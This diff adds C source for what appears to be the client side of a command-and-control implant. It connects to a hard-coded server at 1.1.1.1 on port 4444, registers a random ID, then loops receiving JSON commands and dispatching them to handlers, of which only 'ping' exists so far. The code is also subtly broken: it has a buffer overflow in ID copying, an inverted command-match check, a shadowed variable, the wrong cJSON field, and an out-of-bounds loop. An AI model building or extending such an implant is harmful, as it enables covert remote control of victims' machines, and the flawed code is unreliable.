@@ -1,0 +1,92 @@
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+#include <cJSON.h>
+#include <socket.h>
+#include <commands.h>
+
+#define IP "1.1.1.1"
+#define PORT 4444
+
+typedef struct Command {
+  char name[50];
+  void (*func)(int client_fd, int job);
+} Command;
+
+void generate_id(char* out, int length) {
+  const char CHARS[] = "abcdefghijklmnopqrstuvwxyz1234567890";
+
+  srand((unsigned) time(NULL));
+  char random[length + 1];
+
+  int c = 0;
+  int nbChars = sizeof(CHARS) - 1;
+  
+  for (int i = 0; i < length; i++) {
+    c = rand() % nbChars;
+    random[i] = CHARS[c];
+  }
+
+  random[length] = '\0';
+
+  strcpy(out, random);
+}
+
+int command_exists(Command* commands_array, char* func_name, int arraylen) {
+  for (int i = 0; i < arraylen; i++) {
+    if (strcmp(commands_array[i].name, func_name)) {
+      return i;
+    }
+  }
+
+  return -1;
+}
+
+void cmds_execution(int client_fd, Command* commands, int commands_len) {
+  char cmd[1024];
+  while (1) {
+    rrecv(client_fd, cmd, 1024);
+
+    cJSON* cmd_json = cJSON_Parse(cmd); // heap allocation
+
+    char* cmd = cJSON_GetObjectItem(cmd_json, "exec")->string;
+    int job = cJSON_GetObjectItem(cmd_json, "job")->valueint;
+
+    int index;
+
+    if ((index = command_exists(commands, cmd, commands_len)) < 0) {
+      send_response(client_fd, "", false, job);
+    } else {
+      commands[index].func(client_fd, job);
+    }
+
+    cJSON_Delete(cmd_json);
+  }
+}
+
+int main() {
+  char id[20];
+  int commands_length = 0;
+  Command commands[] = {
+    {.name = "ping", .func = cmd_ping},
+  };
+
+  for (;commands[commands_length].name[0] != '\0'; commands_length++) {}
+
+  generate_id(id, 20);
+
+  int client_fd = connect_server_c2(IP, PORT);
+
+  if (client_fd < 0) {
+    return 1;
+  }
+
+  send_str(client_fd, id);
+
+  cmds_execution(client_fd, commands, commands_length);
+
+  return 0;
+}
